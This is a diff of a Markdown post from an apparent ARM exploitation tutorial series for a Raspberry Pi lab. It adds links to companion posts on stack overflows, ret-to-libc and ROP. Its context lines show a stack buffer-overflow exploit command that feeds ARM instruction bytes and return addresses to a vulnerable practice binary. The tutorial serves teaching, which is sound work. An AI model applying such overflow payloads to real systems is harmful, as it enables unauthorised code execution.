@@ -193,9 +193,16 @@ gef> run $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\xe0\x9f\
 ```
 ./buf $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\xe0\x9f\xe5\x01\xe4\x4e\xe2\x1e\xff\x2f\xe1"+ "\x1c\x05\x01\x01" + "JUNK"+ "\x7c\xf4\xff\x7e"')
 ```
+
+
+## Full ARM Exploitation Series
+* [ARM Exploitation with Raspberry Pi: Lab Setup](https://shantoroy.com/security/ARM-exploitation-Raspberry-Pi-lab-setup/)
+* [ARM Exploitation with Raspberry Pi: Basic Stack Overflow](https://shantoroy.com/security/ARM-exploitation-raspberry-pi-stack-overflow/)
+* [ARM Exploitation with Raspberry Pi: ARM Ret-to-Libc](https://shantoroy.com/security/ret-to-libc-arm-exploitation-raspberry-pi/)
+* [ARM Exploitation with Raspberry Pi: Introduction to Return Oriented Programming (ROP)](https://shantoroy.com/security/simple-rop-arm-exploitation-return-oriented-programming/)
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE5MzcxNzkxNTgsLTIxNDM4ODcxOTEsMT
-AxMzE4MTg3OCwtNzc4NjQ5Mzc0LC0xNDY5MTI3MjM5LDIwNDQw
-MDc3OTUsMTg5MzA3NzM4NCwxMDY0NTgzNDEzLDI5MzE3MjUxLD
-k2MzQyNzc0NCwxODk1Njc4ODU0LDEyMjUwNTQ2MDFdfQ==
+eyJoaXN0b3J5IjpbMTA4MDkxMTE0OSwtMjE0Mzg4NzE5MSwxMD
+EzMTgxODc4LC03Nzg2NDkzNzQsLTE0NjkxMjcyMzksMjA0NDAw
+Nzc5NSwxODkzMDc3Mzg0LDEwNjQ1ODM0MTMsMjkzMTcyNTEsOT
+YzNDI3NzQ0LDE4OTU2Nzg4NTQsMTIyNTA1NDYwMV19
 -->
